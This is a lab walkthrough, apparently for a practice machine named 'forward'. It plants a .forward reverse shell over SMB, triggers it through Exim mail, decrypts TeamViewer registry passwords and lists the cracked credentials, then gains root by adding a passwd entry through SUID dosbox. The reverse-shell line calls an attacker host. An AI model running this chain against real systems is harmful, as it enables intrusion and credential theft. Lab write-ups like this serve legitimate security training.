# Export
```bash
export IP="192.168.185.157"
export URL="http://192.168.185.157:80/FUZZ"
```


<hr>

# RCE
+ `.forward` → RCE

```bash
$ cat .forward 
root
"|/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.49.185/22 0>&1'"
$ smbclient \\\\192.168.185.157\\fox -U fox
Enter WORKGROUP\fox's password: 
Try "help" to get a list of possible commands.
smb: \> put .forward
putting file .forward as \.forward (0.1 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Fri Aug 20 03:17:16 2021
  ..                                  D        0  Sat Jan  9 05:04:11 2021
  .bashrc                             H     3526  Fri Dec 18 18:48:44 2020
  .Xauthority                         H       53  Tue Aug 10 07:55:45 2021
  .bash_history                       H        0  Tue Aug 24 05:08:55 2021
  .profile                            H      807  Fri Dec 18 18:48:44 2020
  local.txt                           N       33  Tue Aug 24 09:04:02 2021
  .dosbox                            DH        0  Tue Aug 10 07:55:54 2021
  .bash_logout                        H      220  Fri Dec 18 18:48:44 2020
  .gnupg                             DH        0  Tue Aug 10 07:40:39 2021
  .forward                           AH       71  Tue Aug 24 09:05:45 2021

                14384136 blocks of size 1024. 11597108 blocks available
```

+ Send Mail → Trigger the `.forward`

```bash
$ telnet 192.168.185.157 25
Trying 192.168.185.157...
Connected to 192.168.185.157.
Escape character is '^]'.
220 forward ESMTP Exim 4.92 Mon, 23 Aug 2021 19:05:33 -0400
EHLO forward
250-forward Hello forward [192.168.49.185]
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-CHUNKING
250-PRDR
250 HELP
mail from: jay@jayngng.github.io
250 OK
rcpt to: fox@forward
250 Accepted
data
354 Enter message, ending with "." on a line by itself
Hi fox, .forward and SMB share → RCE. Please contact me for mitigation strategies!   

Thanks,
Jay
.
```

+ Reverse shell

```bash
$ sudo nc -nlvp 22
Listening on 0.0.0.0 22
Connection received on 192.168.185.157 60456
bash: cannot set terminal process group (898): Inappropriate ioctl for device
bash: no job control in this shell
fox@forward:~$ id    
id
uid=1000(fox) gid=100(users) groups=100(users)
```

<hr>

# Credentials
+ `SMB` → `fox:iparalipomenidellabatracomiomachia`
+ `SSH` → `fox:CIARLARIELLOkj99`

<hr>

# Local Enumeration
```bash
fox@forward:~$ find /home/* -name .bash_history -size +0 -exec cat {} \; 2>/dev/null                                                                                                                               
sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191
```

<hr>

# Privilege Escalation
+ SUID `dosbox`.

```bash
fox@forward:~$ find / -perm -u=s -ls 2>/dev/null
[...]
   283136   2612 -rwsr-sr-x   1 root     root        2671432 Jul  8  2019 /usr/bin/dosbox
[...]
```

+ Create a copy of `passwd`.

```bash
fox@forward:~$ cp /etc/passwd .
fox@forward:~$ echo 'jay:$1$letmein1$WSOs/feh/fhyU4QWmT0aG1:0:0::/root:/bin/bash' >> passwd
```

+ SSH with X11 Forwarding flag set.
```bash
$ ssh fox@$IP -X
$ dosbox # -> launch dosbox. 
```


+ From `dosbox` console
```bash
Z:\> mount e /etc
Z:\> mount f /home/fox
R:\> copy f:\passwd passwd
```

+ New `passwd` entry

```bash
fox@forward:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
jay:$1$letmein1$WSOs/feh/fhyU4QWmT0aG1:0:0::/root:/bin/bash
fox@forward:~$ su jay # → password is admin123
Password: 
root@forward:/home/fox# id
uid=0(root) gid=0(root) groups=0(root)
```
<hr>

# Nmap
```bash
$ sudo nmap -sV -p- --open -oA nmap/services -Pn 192.168.185.157
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp  open  smtp        Exim smtpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

<hr>

# SMB
+ Files shares

```bash
$ smbmap -H $IP
[+] IP: 192.168.112.157:445     Name: 192.168.112.157                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        utils                                                   READ ONLY       Utilities
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

+ `utils` share
```bash
$ smbclient \\\\192.168.185.157\\utils -U 'anonymous'
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Dec 18 19:26:48 2020
  ..                                  D        0  Fri Dec 18 18:48:44 2020
  fox.reg                             N    10634  Fri Dec 18 18:48:44 2020
  TeamViewer_Setup_v7.exe             N  5024832  Fri Dec 18 18:48:44 2020
  mara.reg                            N    10408  Fri Dec 18 18:48:44 2020
  vale.reg                            N    10206  Fri Dec 18 18:48:44 2020
  golemitratigunda.reg                N    10206  Fri Dec 18 18:48:44 2020
  alberobello.reg                     N    10206  Fri Dec 18 18:48:44 2020
  giammy.reg                          N    10312  Fri Dec 18 18:48:44 2020
  README.all                          N      165  Fri Dec 18 18:53:55 2020

                14384136 blocks of size 1024. 11597116 blocks available
```

+ `README.all`

```bash
$ cat README.all 
each of you has to install TeamViewer and then import your own registry key for automatic configuration.
Don't worry about the password, it's well encrypted!

Root!
```


+ Convert `.reg` to unix-readable format

```bash
$ dos2unix mara.reg 
dos2unix: converting UTF-16LE file mara.reg to UTF-8 Unix format...
$ file mara.reg 
mara.reg: ASCII text
$ cat mara.reg
[...]
"SecurityPasswordAES"=hex:88,9d,f1,f5,80,27,74,a5,d2,45,be,78,b1,7e,56,a0,1f,\
  16,12,86,64,88,3e,73,b9,02,5e,7b,78,2e,0f,7e,b0,61,f1,69,7b,a9,aa,46,41,f1,\
  cc,27,51,97,73,e7,4e,58,e5,f2,08,ab,b6,4a,8e,e1,b0,f6,e4,77,02,78
[...]
```

+ TeamViewer Pssword Decryptor.
+ PoC: https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0

```bash
$ python3 teamviewer_password_decrypt.py 
This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
[...]

Enter output from registry without spaces : 2c0fff76ca03d7c21c0d3c8b55edd8de37f89720ae6ed382d0ad2e70f97effea0b0c1cd901cbd1ad90fc601b9e40fc9c4baf65eec51962eb4edacc7c30a8a66b0cbd9f362ac0cad1598904aecb8b9610
Decrypted password is :  iparalipomenidellabatracomiomachia
```

+ Decrypt all passwords:

```md 
iparalipomenidellabatracomiomachia
alberobello
hackmeifyoureable
cocomerirossi
bangladesh
paralipomenibatracomiomachia
```

+ List all the shares again? but with `fox` user

```bash
$ smbmap -H 192.168.117.157 -u fox -p iparalipomenidellabatracomiomachia
[+] IP: 192.168.117.157:445     Name: 192.168.117.157                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        utils                                                   READ ONLY       Utilities
        print$                                                  READ ONLY       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
        fox                                                     READ, WRITE     Home Directories
```

+ `fox` shares

```bash
$ smbclient \\\\192.168.185.157\\fox -U fox
Enter WORKGROUP\fox's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 24 08:43:00 2021
  ..                                  D        0  Sat Jan  9 05:04:11 2021
  .bashrc                             H     3526  Fri Dec 18 18:48:44 2020
  .Xauthority                         H       53  Tue Aug 10 07:55:45 2021
  .bash_history                       H        0  Tue Aug 24 05:08:55 2021
  .profile                            H      807  Fri Dec 18 18:48:44 2020
  local.txt                           N       33  Tue Aug 24 08:27:52 2021
  .dosbox                            DH        0  Tue Aug 10 07:55:54 2021
  .bash_logout                        H      220  Fri Dec 18 18:48:44 2020
  .gnupg                             DH        0  Tue Aug 10 07:40:39 2021
  .forward                           AH        1  Fri Aug 20 03:17:16 2021

                14384136 blocks of size 1024. 11597116 blocks available
```

